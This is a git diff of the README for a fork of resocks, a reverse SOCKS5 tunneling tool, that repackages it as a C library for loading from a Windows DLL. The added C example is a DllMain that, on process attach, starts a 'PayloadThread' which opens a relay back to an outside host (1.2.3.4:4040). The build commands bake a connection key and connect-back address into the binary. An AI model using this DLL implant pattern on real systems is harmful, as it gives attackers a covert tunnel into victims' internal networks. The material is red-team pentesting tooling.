@@ -1,5 +1,5 @@
 <p align="center">
-  <h1 align="center"><b>resocks</b></h1>
+  <h1 align="center"><b>resocks_c-archive</b></h1>
   <p align="center"><i></i></p>
   <p align="center">
     <a href="https://github.com/RedTeamPentesting/resocks/releases/latest"><img alt="Release" src="https://img.shields.io/github/release/RedTeamPentesting/resocks.svg?style=for-the-badge"></a>
@@ -18,6 +18,8 @@ certificates based on a connection key. Read our
 [blog post](https://blog.redteam-pentesting.de/2023/introducing-resocks/)
 for more information.
 
+This fork is meeting the needs I had where the a DLL needed to load the RESOCKS library.
+
 ![resocks](assets/resocks.png)
 
 ## Usage
@@ -30,12 +32,40 @@ tunnel:
 $ resocks listen
 ```
 
-Copy the connection key and pass it to `resocks` on the relay
-system:
+Include the generated header and call the "ResocksStartRelay()" function to start:
 
-```bash
-# on remote relay system with IP 10.0.0.1
-$ resocks 1.2.3.4 --key $CONNECTION_KEY
+```C
+#include "proxy_resolver.h"
+#include "libresocks.h"
+
+static DWORD WINAPI PayloadThread(LPVOID lpParam) {
+    (void)lpParam;
+
+    ResocksStartRelay(
+        "1.2.3.4:4040",
+        "<RESOCKS-KEY>",
+        5,
+        10,
+        0
+    );
+
+    return 0;
+}
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved)
+{
+    (void)lpReserved;
+    switch (dwReason) {
+    case DLL_PROCESS_ATTACH:
+        DisableThreadLibraryCalls(hModule);
+        CreateThread(NULL, 0, PayloadThread, NULL, 0, NULL);
+        break;
+    case DLL_PROCESS_DETACH:
+        ResocksStop();
+        break;
+    }
+    return TRUE;
+}
 ```
 
 Now configure tools on the proxy entry point system to use the local SOCKS5
@@ -115,7 +145,10 @@ low-privileged attackers from gaining access to the connection keys.
 `resocks` can be built with the following command:
 
 ```bash
-go build
+set GOOS=windows
+set GOARCH=amd64
+set CGO_ENABLED=1
+go build -buildmode=c-archive -o ..\libresocks.a .
 ```
 
 In order to compile a static connection key as the default connection key
@@ -123,12 +156,13 @@ directly into the binary, use the following command:
 
 ```bash
 go run . generate  # generate a connection key
-go build -ldflags="-X main.defaultConnectionKey=YOUR_CONNECTION_KEY"
+go build -buildmode=c-archive -ldflags="-X main.defaultConnectionKey=YOUR_CONNECTION_KEY" -o ..\libresocks.a .
 ```
 
 Similarly, the default connect back address can also be statically compiled into
 the binary:
 
 ```bash
-go build -ldflags="-X main.defaultConnectBackAddress=192.0.2.1"
+go build -buildmode=c-archive -ldflags="-X main.defaultConnectBackAddress=192.0.2.1" -o ..\libresocks.a .
 ```
+
